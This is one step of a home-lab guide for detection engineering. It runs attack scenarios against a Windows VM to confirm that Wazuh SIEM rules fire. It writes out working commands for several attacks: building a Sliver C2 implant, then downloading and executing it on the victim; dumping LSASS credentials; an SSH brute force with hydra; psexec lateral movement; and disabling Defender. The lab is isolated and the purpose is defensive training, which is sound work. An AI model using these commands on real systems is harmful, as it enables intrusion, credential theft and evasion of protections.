# Step 8: Attack Simulation

Execute attack scenarios to generate real detection signals. This validates that your SIEM rules fire against actual adversary behavior, not just synthetic log samples.

**Prerequisites:** Steps 4, 5, 6, and 7 must all be complete.

**Estimated time:** 60 minutes

> **Safety:** All attacks run inside UTM's 192.168.64.0/24 network. No traffic reaches your home LAN or the internet. Before running any scenario, verify Sliver's C2 listener is bound to `192.168.64.30`, not `0.0.0.0`. See Step 7.2 safety check.

---

## 8.1 — Pre-Flight Checklist

Run through this before each attack session:

```bash
# [manager] Verify all Wazuh services are running
sudo systemctl status wazuh-indexer wazuh-manager wazuh-dashboard --no-pager | \
  grep -E "Active:|wazuh"
# All three should show: Active: active (running)

# [manager] Verify agent is connected
sudo /var/ossec/bin/agent_control -l
# victim-windows should show: Active
```

```powershell
# [windows] Verify Wazuh agent is running
Get-Service WazuhSvc
# Expected: Status=Running

# Verify Sysmon is running
Get-Service Sysmon64
# Expected: Status=Running
```

```bash
# [host] Open Kibana — keep this open during all attack scenarios
open https://192.168.64.10

# Navigate to: Wazuh → Security Events
# Set time filter: Last 15 minutes  (auto-refresh: 30 seconds)
# You'll watch alerts appear in real-time as attacks execute
```

**Note the current time** — you'll use it as the incident start time when writing reports.

---

## 8.2 — Scenario Quick-Run Reference

The full procedures for each scenario are in `attack-simulation/attack-scenarios/`:

| # | File | Techniques | Expected rules | Time |
|---|------|-----------|----------------|------|
| 1 | [01-initial-access-c2.md](../attack-simulation/attack-scenarios/01-initial-access-c2.md) | T1071.001 C2 beaconing | 100009, 100010, 100011 | 15 min |
| 2 | [02-credential-dumping.md](../attack-simulation/attack-scenarios/02-credential-dumping.md) | T1003.001 LSASS dump | 100005 | 10 min |
| 3 | [03-lateral-movement.md](../attack-simulation/attack-scenarios/03-lateral-movement.md) | T1110.001 + T1021.002 | 100001, 100002, 100012 | 15 min |
| 4 | [04-persistence.md](../attack-simulation/attack-scenarios/04-persistence.md) | T1053.005 + T1562.001 | 100015, 100017, 100018 | 10 min |
| 5 | [05-full-kill-chain.md](../attack-simulation/attack-scenarios/05-full-kill-chain.md) | All of the above | All 8 rule groups | 45 min |

Run scenarios 1–4 individually before attempting the full kill chain (scenario 5).

---

## 8.3 — Scenario 1: Sliver C2 Beaconing (Quick-Run)

See the full procedure in `01-initial-access-c2.md`. Quick commands:

```bash
# [kali] Start Sliver server (if not already running)
sudo sliver-server daemon &
sleep 3
```

```bash
# [kali] Open Sliver client and start HTTPS listener
sliver

# Inside sliver prompt:
sliver > https --lport 443 --lhost 192.168.64.30
sliver > jobs
# Expected:
# [*] Jobs
# ID  Name   Protocol  Ports
# ==  ====   ========  =====
# 1   https  tcp       443

# Generate implant
sliver > generate --https 192.168.64.30 --os windows --arch arm64 \
  --name lab-implant-001 --save /tmp/
# Expected: "[*] Implant saved to /tmp/lab-implant-001.exe"

sliver > implants
# Verify the implant appears in the list
```

```bash
# [kali — new terminal, keep sliver running] Serve implant
cd /tmp
python3 -m http.server 8080 &
```

```powershell
# [windows] Download and execute implant (simulates user clicking a phishing attachment)
New-Item -ItemType Directory -Path C:\Temp -Force
Invoke-WebRequest -Uri http://192.168.64.30:8080/lab-implant-001.exe -OutFile C:\Temp\svcupdate.exe
C:\Temp\svcupdate.exe
```

```bash
# [kali — sliver prompt] Wait for the beacon to check in
sliver > sessions
# Within 30 seconds, should show a new session
# Example:
# ID  Transport  Remote Address      Hostname      Username  OS/Arch
# ==  =========  ==============      ========      ========  =======
# 1   https      192.168.64.20:PORT  VICTIM-WIN    socadmin  windows/arm64

# Interact with the session
sliver > use 1
sliver (lab-implant-001) > info
```

**Monitor in Kibana:** Navigate to Wazuh → Security Events. Within 5 minutes of beacon startup, you should see rules 100009 (C2 connection base), 100010 (beaconing frequency), and 100011 (unsigned binary) fire.

---

## 8.4 — Scenario 2: Credential Dumping (Quick-Run)

Requires an active Sliver session from Scenario 1, or run the ART test standalone:

**Option A: Via Sliver session**

```bash
# [kali — sliver prompt with active session]
sliver (lab-implant-001) > procdump --pid [LSASS_PID] --save /tmp/lsass.dmp

# Find LSASS PID first:
sliver (lab-implant-001) > ps | grep -i lsass
```

**Option B: Via Atomic Red Team (standalone)**

```powershell
# [windows]
Import-Module invoke-atomicredteam

# Test T1003.001 — LSASS dump via procdump (ART downloads procdump automatically)
Invoke-AtomicTest T1003.001 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 1
```

**Monitor in Kibana:** Rule 100005 should fire (Sysmon EID 10, grantedAccess 0x1fffff, target: lsass.exe). Detection latency should be under 5 seconds from when the dump is taken.

---

## 8.5 — Scenario 3: SSH Brute Force + Lateral Movement (Quick-Run)

```bash
# [kali] SSH brute force against wazuh-manager
# Uses rockyou wordlist — set limit to avoid running forever
hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt \
  -t 4 -W 3 -f \
  192.168.64.10 ssh
# -f stops on first success, -t 4 threads, -W 3 wait between attempts
```

**Monitor in Kibana:** Rule 100001 fires after 5 failed attempts (within 60s). Rule 100002 fires if a successful login follows.

> **Note:** If you set up SSH key-only auth, hydra won't succeed on login. That's fine — rule 100001 fires on the brute force attempts themselves.

```bash
# [kali] PsExec-style lateral movement (after brute force)
# Requires SMB access to victim-windows

# Using impacket's psexec
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  socadmin:YOUR_PASSWORD@192.168.64.20 cmd
# If successful: opens a SYSTEM cmd shell on victim-windows
```

**Monitor in Kibana:** Rule 100012 fires on EventID 7045 (PSEXESVC service install).

---

## 8.6 — Scenario 4: Persistence (Quick-Run)

```powershell
# [windows] Test scheduled task persistence (T1053.005)
Import-Module invoke-atomicredteam
Invoke-AtomicTest T1053.005 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1053.005 -TestNumbers 1
```

```powershell
# [windows] Test Defender tampering (T1562.001)
# NOTE: This disables Windows Defender briefly — re-enable after
Import-Module invoke-atomicredteam
Invoke-AtomicTest T1562.001 -TestNumbers 1
```

**Monitor in Kibana:** Rules 100017/100018 for scheduled task, rules 100015/100016 for Defender tampering.

---

## 8.7 — Monitoring Guide

### Real-Time Monitoring in Kibana

1. Open `https://192.168.64.10`
2. Navigate: **Wazuh → Security Events**
3. Set time filter to "Last 30 minutes" with "Auto-refresh: 30 seconds"
4. Useful filters to apply:
   - `rule.level >= 10` — only high-severity alerts
   - `agent.name: victim-windows` — filter to the target VM
   - `rule.groups: sysmon_event10` — LSASS access events

### Real-Time Monitoring from Manager CLI

```bash
# [manager] Live alert stream with rule ID and description
sudo tail -f /var/ossec/logs/alerts/alerts.json | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        a = json.loads(line)
        level = a['rule']['level']
        rule_id = a['rule']['id']
        desc = a['rule']['description'][:60]
        agent = a.get('agent', {}).get('name', 'manager')
        ts = a['timestamp'][11:19]
        if level >= 10:
            print(f'{ts} | RULE {rule_id} (lv{level}) | {agent} | {desc}')
    except: pass
"
```

Press `Ctrl+C` to stop watching.

---

## 8.8 — Screenshot Guide

Capture these screenshots for your portfolio and incident reports:

| What to capture | Where | When |
|----------------|-------|------|
| Wazuh Agents page — both agents Active | Kibana → Wazuh → Agents | Before attacks |
| MITRE ATT&CK heatmap with covered techniques | Kibana → Wazuh → MITRE ATT&CK | After all scenarios |
| Rule 100005 firing (LSASS alert) | Kibana → Security Events | During Scenario 2 |
| Rule 100002 firing (brute+success) | Kibana → Security Events | During Scenario 3 |
| Raw Sysmon event JSON | Kibana → click any Sysmon alert → expand JSON | During any scenario |
| Sliver session listing | Kali terminal | During Scenario 1 |

Save screenshots to `~/Projects/soc-home-lab/docs/screenshots/`:

```bash
# [host] Create screenshots directory
mkdir -p ~/Projects/soc-home-lab/docs/screenshots
```

Use macOS screenshot: `Cmd+Shift+4` → click-drag to capture a region.

---

## 8.9 — Cleanup After Each Scenario

Always clean up after simulations to restore the victim to a known-clean state:

```powershell
# [windows] Remove Sliver implant and persistence
Remove-Item -Path C:\Temp\svcupdate.exe -Force -ErrorAction SilentlyContinue
Remove-Item -Path C:\Temp\*.exe -Force -ErrorAction SilentlyContinue
Remove-Item -Path C:\Temp\*.dmp -Force -ErrorAction SilentlyContinue

# Remove any Run key persistence
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name * -ErrorAction SilentlyContinue

# Remove scheduled tasks created by ART
schtasks /delete /tn "T1053.005*" /f 2>/dev/null

# Re-enable Defender (if it was disabled)
Set-MpPreference -DisableRealtimeMonitoring $false

# Restart Wazuh agent to clear any agent-side state
Restart-Service WazuhSvc
```

```bash
# [kali] Stop Sliver jobs and server
# Inside sliver prompt:
sliver > jobs --kill 1   # Stop HTTPS listener
sliver > exit

# Stop sliver-server daemon
sudo pkill sliver-server
```

**UTM snapshot restore** (fastest cleanup): restore the "clean-baseline" snapshot you created in Step 2 on victim-windows. This returns the VM to its exact post-install state.

---

## Troubleshooting

**Sliver implant runs but doesn't connect back to Kali**

1. Verify the HTTPS listener is running: `sliver > jobs`
2. Check Kali's firewall: `sudo iptables -L INPUT | grep 443` — should not block port 443 inbound
3. Verify victim can reach Kali: `Test-NetConnection 192.168.64.30 -Port 443` from Windows

**ART test fails: "GetPrereqs timed out"**

ART downloads some tools (procdump, etc.) from GitHub during GetPrereqs. If GitHub is slow:
```powershell
# [windows] Manually download the prerequisite and place it where ART expects it
# Check the test YAML for the expected path:
Invoke-AtomicTest T1003.001 -TestNumbers 1 -ShowDetails
# Look for "DependencyExecutorType" and "prereq_command" fields
```

**hydra brute force: no alerts firing in Wazuh**

Check that Wazuh rule 100001's parent SID (5710) is firing first:
```bash
# [manager]
sudo tail -20 /var/ossec/logs/alerts/alerts.json | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        a = json.loads(line)
        print(a['rule']['id'], a['rule']['description'][:60])
    except: pass
"
# If you see rule 5710 (SSHD invalid user) but not 100001:
# Check that 100001-brute-force-ssh.xml is in /var/ossec/etc/rules/
```

**Rule fires but Kibana doesn't show it**

Kibana can have a few minutes of ingestion lag. Wait 2–3 minutes, then hard-refresh (Ctrl+Shift+R). If still missing, check Filebeat:
```bash
# [manager]
sudo systemctl status filebeat
sudo tail -20 /var/log/filebeat/filebeat
```

---

## Checklist — Step 8 Complete When:

- [ ] Scenario 1: Rule 100010 or 100011 fired (C2 beaconing)
- [ ] Scenario 2: Rule 100005 fired (LSASS access)
- [ ] Scenario 3: Rule 100001 fired (SSH brute force) + Rule 100012 fired (PsExec)
- [ ] Scenario 4: Rules 100017/100018 fired (scheduled task)
- [ ] All Kibana screenshots captured and saved to `docs/screenshots/`
- [ ] Cleanup complete on victim-windows (no implants running)
- [ ] Incident report drafted for at least one scenario (see `incident-reports/TEMPLATE.md`)

**Next step → [09-detection-validation.md](09-detection-validation.md)**
